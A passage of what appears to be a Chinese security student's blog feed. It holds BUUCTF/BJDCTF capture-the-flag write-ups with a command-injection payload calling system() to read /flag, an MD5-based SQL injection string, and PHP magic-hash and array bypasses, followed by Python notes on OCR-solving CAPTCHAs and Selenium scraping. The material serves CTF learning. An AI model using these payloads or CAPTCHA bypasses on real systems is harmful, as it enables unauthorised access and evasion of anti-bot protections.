class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure></p><p>得到flag</p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开之后是个查询窗口，F12也没有什么提示，所以使用BP抓包一下，得到了hint<br>Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>查询了一下md5($pass,true)</p><p>参考了这些文章：<br><a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a><br><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">https://www.jianshu.com/p/12125291f50d</a><br><a href="https://www.cnblogs.com/tqing/p/11852990.html" target="_blank" rel="noopener">https://www.cnblogs.com/tqing/p/11852990.html</a></p><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>1）经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p><p>2）在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true</p><p>3）ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p><p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">以下值在md5加密后以<span class="number">0</span>E开头：</span><br><span class="line"></span><br><span class="line">    QNKCDZO</span><br><span class="line">    <span class="number">240610708</span></span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line"></span><br><span class="line">PHP在处理哈希字符串时，它把每一个以“<span class="number">0</span>E”开头的哈希值都解释为<span class="number">0</span>，所以如果两个不同的密码经过哈希以后，其哈希值都是以“<span class="number">0</span>E”开头的，那么PHP将会认为他们相同，都是<span class="number">0</span>。</span><br></pre></td></tr></table></figure><h3 id="与"><a href="#与" class="headerlink" title="===与!=="></a>===与!==</h3><p>===是包括变量值与类型完全相等，而==只是复比较两个数的值是否相等。<br>比如：100==“100” 这里用==，因为它们制的值相等，都是知100，结果为道真<br>但是若用===，因为左边是一个整型而右边则是一个字符串类型的数，类型不相同所以结果为假</p><h2 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h2><p>直接构造pylioad<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leveldo4.php?<span class="attribute">password</span>=ffifdyop</span><br></pre></td></tr></table></figure></p><p>得到代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br>分析源码发现是非常常规的md5碰撞或者可以采用数组</p><p>方法一:md5碰撞<br>pyload:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>这里由于使用了===和!== 所以只好使用数组来进行绕过<br><img src="/images/Nepnep/[BJDCTF2nd]old-hack2.png" alt="avatar"></p><p>得到flag</p><p>方法二：数组<br>pyload:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>后面的步骤与方法一相同 这里不再细说</p>]]></content:encoded>
      
      <comments>http://yoursite.com/2020/05/08/BUUCTF-Nepnep-0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python3-2020/5/1-周报10</title>
      <link>http://yoursite.com/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/</link>
      <guid>http://yoursite.com/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/</guid>
      <pubDate>Sat, 02 May 2020 00:53:51 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;验证码的识别&quot;&gt;&lt;a href=&quot;#验证码的识别&quot; class=&quot;headerlink&quot; title=&quot;验证码的识别&quot;&gt;&lt;/a&gt;验证码的识别&lt;/h1&gt;&lt;p&gt;随着爬虫越来越多，许多网站都采取了各种各样的反爬虫机制，其中最常见的就是使用验证码，现在随着技术的发展，验证
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="验证码的识别"><a href="#验证码的识别" class="headerlink" title="验证码的识别"></a>验证码的识别</h1><p>随着爬虫越来越多，许多网站都采取了各种各样的反爬虫机制，其中最常见的就是使用验证码，现在随着技术的发展，验证码已经由数字演变成了字母，滑动，九宫格等各种验证码</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于tesserocr库是比较老的库，目前只更新到只吃python3.7，而由于我的是python3.8经过多次尝试之后，发现还是无法使用，经过查看大量的资料，我使用了另外一个库—pytesseract</p><p>pytesseract这个库原理几乎和tesserocr库相同</p><h2 id="图形验证码识别"><a href="#图形验证码识别" class="headerlink" title="图形验证码识别"></a>图形验证码识别</h2><p>我们先识别一下最简单的一种验证码，即图形验证码。这种验证码最早出现，也很常见，一般是由4位字母或者数字组成。例如<a href="http://my.cnki.net/Register/CommonRegister.aspx的登录验证码" target="_blank" rel="noopener">http://my.cnki.net/Register/CommonRegister.aspx的登录验证码</a></p><h3 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h3><p>首先需要安装pytesseract库</p><p>为了便于实验，我们先将验证码图片保存在本地，先测试一下</p><p>首先F12打开开发者工具，查看验证码的url<br><img src="/images/python3/验证码0.png" alt="avatar"></p><p>接下来访问一下这个aspx<br><img src="/images/python3/验证码1.png" alt="avatar"><br>由于验证码是动态的 所以也没有什么太大的关系</p><p>加下来把这个aspx保存下来，命名为code.png</p><p>代码：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Gsee</span><br></pre></td></tr></table></figure></p><p>这里新建了一个Image对象，调用了pytesseract的image_to_string()方法，传入该对象即可完成识别，但是要注意的是，由于pytesseract的特殊性，处理图片时，由于图片可能不是RGBA通路的，所以最后在打开图片后等增加image.convert(‘RGB’)语句，保证图片是RGB格式的</p><h3 id="验证码处理"><a href="#验证码处理" class="headerlink" title="验证码处理"></a>验证码处理</h3><p>接下来我们换一个验证码，命名为code2.png<br><img src="/images/python3/code2.png" alt="avatar"></p><p>重新用以下代码来测试：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code2.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br></pre></td></tr></table></figure><br>我刷新的这个验证码并没有出现偏差，但是例如<br><img src="/images/python3/test.jpg" alt="avatar"><br>就会出现偏差<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.jpg'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">thye</span><br></pre></td></tr></table></figure><br>这个时候，其实是因为验证码多余的线条干扰了图片的识别，我们在这里还需要进行额外的处理，如转灰度，二值化等操作</p><p>我们可以利用Image对象的convert()方法传入L，即可将图片转为灰度图像<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/images/python3/验证码2.png" alt="avatar"></p><p>这样就成功将其灰度化</p><p>传入1即可将图片进行二值化处理<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br>我们还可以指定二值化的阈值，上面的方法默认采用的是127.不过我们不能直接转换，需要将图片先灰度化，然后化再指定阈值<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.point(table,'<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/images/python3/验证码3.png" alt="avatar"><br>这里将阈值调整为110 图片中的内容才能显示完成，阈值的值是根据验证码的情况来确定的，并不是一个定值</p><p>我们看到经过处理之后的验证码，线条已经被去除，验证码变得黑白分明，这个时候才重新识别验证码<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'L'</span>)</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">point</span>(table,<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">fhYe</span><br></pre></td></tr></table></figure><br>针对一些有干扰的图片，我们就可以做一些灰度和二值化的处理，以此来提高图片的正确率</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.tesseror库比较过时，而且版本更新较慢，目前只支持到了python3.7的版本</p><p>2.由于tesseror库无法使用，所以采用了pytesseract库，但是由于pytesseract库的特性，只会识别RGB通道的图片，所以需要在每条语句的后面都添加上image.convert(‘RGB’)</p><p>3.文字验证码较为简单，但是会有一些斑点或线条等进行干扰，所以需要采用灰度和二值化来进行处理</p><p>4.二值化处理之前需要先进行灰度化的处理，并且每个图片需要设置的阈值可能会不同，阈值不是一个定值，需要经常进行更换</p>]]></content:encoded>
      
      <comments>http://yoursite.com/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python3-2020/4/26-周报9</title>
      <link>http://yoursite.com/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/</link>
      <guid>http://yoursite.com/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/</guid>
      <pubDate>Sun, 26 Apr 2020 00:08:55 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;动态渲染页面爬取&quot;&gt;&lt;a href=&quot;#动态渲染页面爬取&quot; class=&quot;headerlink&quot; title=&quot;动态渲染页面爬取&quot;&gt;&lt;/a&gt;动态渲染页面爬取&lt;/h1&gt;&lt;p&gt;前面了解到了Ajax的分析和爬取方式，这其实也是JavaScript动态渲染页面的一种方式，
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="动态渲染页面爬取"><a href="#动态渲染页面爬取" class="headerlink" title="动态渲染页面爬取"></a>动态渲染页面爬取</h1><p>前面了解到了Ajax的分析和爬取方式，这其实也是JavaScript动态渲染页面的一种方式，通过直接分析Ajax,仍然可以借助requests或urllib来实现数据爬取</p><p>但是JavaScript的动态渲染页面不止Ajax这一种，例如有些网站的分页是由JavaScript生成的，并非是原始的HTML代码，其中也并不包含Ajax</p><h2 id="Selenium的使用"><a href="#Selenium的使用" class="headerlink" title="Selenium的使用"></a>Selenium的使用</h2><p>Selenium是一个自动化测试工具，利用它可以驱动浏览器执行指定的动作，如点击，下来等操作，同时还可以获取浏览器当前呈现的页面的源代码，做到可见即可爬</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys import Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">try:</span><br><span class="line">    browser.<span class="builtin-name">get</span>(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attribute">input</span>=browser.find_element_by_id('kw')</span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">    input.send_keys(Keys.ENTER)</span><br><span class="line">    <span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID , <span class="string">'content_left'</span>)))</span><br><span class="line">    <span class="builtin-name">print</span>(browser.current_url)</span><br><span class="line">    <span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">    <span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">finally:</span><br><span class="line">    browser.close()</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">当前URL，cookies和网页源代码</span><br></pre></td></tr></table></figure><p>再执行上条指令后，会自动弹出一个Chrome浏览器，浏览器首先会跳转到百度，然后在搜索框中输出Python，接着跳转到搜索结果页面<br><img src="/images/python3/selenium0.png" alt="avatar"><br><img src="/images/python3/selenium1.png" alt="avatar"></p><p>这样我们就可以直接拿到JavaScript渲染的结果了</p><h3 id="声明浏览器对象"><a href="#声明浏览器对象" class="headerlink" title="声明浏览器对象"></a>声明浏览器对象</h3><p>Selenium支持非常多的浏览器，如Chrome,Firefox,Edge等，还有Android，BlackBerry等手机端浏览器，还支持无界面浏览器PhantomJS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Firefox()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Edge()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.PhantomJS()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Safari()</span><br></pre></td></tr></table></figure><p>这样就完成了浏览器对象的初始化，并将其赋值为browser对象</p><h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><p>我们可以使用get()方法来请求网页，参数传URL即可<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><br>运行后发现，弹出了Chrome浏览器并且自动访问了淘宝，然后控制台输出了淘宝页面的源代码，随后浏览器关闭</p><h3 id="查找结点"><a href="#查找结点" class="headerlink" title="查找结点"></a>查找结点</h3><p>selenium可以驱动浏览器完成各种操作，比如填充表单，模拟点击等。比如，我们想要完成向某个输入框输入文字的操作，需要知道这个输入框在哪里，而selenium提供了一系列查找节点的方法</p><h4 id="单个节点"><a href="#单个节点" class="headerlink" title="单个节点"></a>单个节点</h4><p>比如，想要从淘宝页面中提取搜索框这个节点，首先观察它的源代码<br><img src="/images/python3/selenium2.png" alt="avatar"><br>可以发现它的id是q,name也是q，此外还有许多其他属性，我们就可以以多种方式获取了<br>比如find_element_by_name()是根据name获取，find_element_by_id()是根据id获取<br>另外，还有根据XPath，CSS选择器等获取方式<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line">input_second=browser.find_element_by_css_selector(<span class="string">'#q'</span>)</span><br><span class="line">input_third=browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(input_first,input_second,input_third)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br></pre></td></tr></table></figure></p><p>我们发现结果一至，可以看到这三个节点都是WebElement类型<br>获取单个节点的方法：<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure><br>此外还提供了通用方法find_element()，它需要传入两个参数，查找方法By和值<br>实际就是上述方法的通用版本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.<span class="keyword">by</span> <span class="keyword">import</span> <span class="keyword">By</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element(<span class="keyword">By</span>.ID,<span class="string">'q'</span>)</span><br><span class="line">print(input_first)</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">输出结果与上面一至</span><br></pre></td></tr></table></figure><h4 id="多个节点"><a href="#多个节点" class="headerlink" title="多个节点"></a>多个节点</h4><p>如果查找的目标在网页中只有一个，那么完全可以使用find_element()方法，但是如果有多个节点，就需要使用find_elements()方法了</p><p>比如淘宝导航条的所有条目<br><img src="/images/python3/selenium3.png" alt="avatar"></p><p>先查看这些条目，发现都在class为service-bd的ul节点的li节点中<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">lis=browser.find_elements_by_css_selector(<span class="string">'.service-bd li'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(lis)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"7237cd9e-6812-41b2-839c-5a5ef0790077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"cd8c7478-6486-4376-8c25-a562dad5be68"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"01ac2aac-0431-49f5-9e9b-244fb11a5b99"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5f10b89b-f4f2-4efb-a084-3ce219e81aa2"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span 